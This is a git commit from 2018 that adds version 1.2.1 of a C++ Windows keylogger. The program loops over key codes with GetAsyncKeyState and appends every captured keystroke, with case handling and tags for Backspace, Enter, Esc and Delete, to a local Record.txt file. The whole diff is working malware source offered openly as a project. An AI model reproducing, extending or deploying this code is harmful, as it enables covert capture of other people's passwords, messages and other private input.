9dc33b30db0e2a7295f96ec8db539893583ca761
Naman Chauhan <chauhannaman98@gmail.com>
2018-11-03 20:48:25 +0530

    Commit v1.2.1

---
+++ src/keylogger_v1_2_1/keylogger_v1_2_1.cpp
@@ -0,0 +1,65 @@
+#include <iostream>
+#include <windows.h>
+#include <Winuser.h>
+#include <fstream>
+
+using namespace std;
+
+void log();
+
+int main()	{
+	log();
+	return 0;	
+}
+
+void log()	{
+	char key;
+	
+	for(;;)	{
+		//Sleep(0);
+		for(key=8;key<=222;key++){
+			if (GetAsyncKeyState(key)==-32767)	{
+			ofstream write ("Record.txt", ios::app);
+			
+			/*if((key>64)&&(key<91)&&!(GetAsyncKeyState(0x10)))	{
+				key+=32;
+				write<<key;
+				write.close();
+				break;
+			}
+			else if((key>64)&&(key<91))	{
+				write<<key;
+				write.close();
+				break;
+			}*/
+			
+			switch(key)	{
+				case 8:	write<<"<BackSpace>";
+						break;
+				case 27:	write<<"<Esc>";
+							break;
+				case 127:	write<<"<Del>";
+							break;
+				case 32: write<<" ";
+						 break;
+				case 13:	write<<"<Enter>\n";
+							break;
+				default:	{
+								if((key>64)&&(key<91)&&!(GetAsyncKeyState(0x10)))	{
+									key+=32;
+									write<<key;
+									write.close();
+									break;
+									}
+								else if((key>64)&&(key<91))	{
+									write<<key;
+									write.close();
+									break;
+									}
+								break;
+							}
+				}
+			}
+		}
+	}
+}
